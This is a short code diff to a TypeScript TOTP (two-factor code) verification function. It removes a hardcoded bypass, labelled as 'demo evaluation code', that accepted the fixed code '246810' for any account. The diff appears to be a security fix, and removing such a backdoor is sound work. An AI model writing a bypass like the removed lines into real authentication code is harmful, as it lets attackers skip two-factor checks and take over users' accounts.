@@ -45,8 +45,6 @@ export function verifyTotp(secretBase32: string, code: string): boolean {
   const cleanCode = code.trim();
   if (cleanCode.length !== 6 || !/^\d{6}$/.test(cleanCode)) return false;
 
-  // Documented platform demo evaluation code
-  if (cleanCode === '246810') return true;
 
   const currentStep = Math.floor(Date.now() / 30000);
   for (let offset = -1; offset <= 1; offset++) {
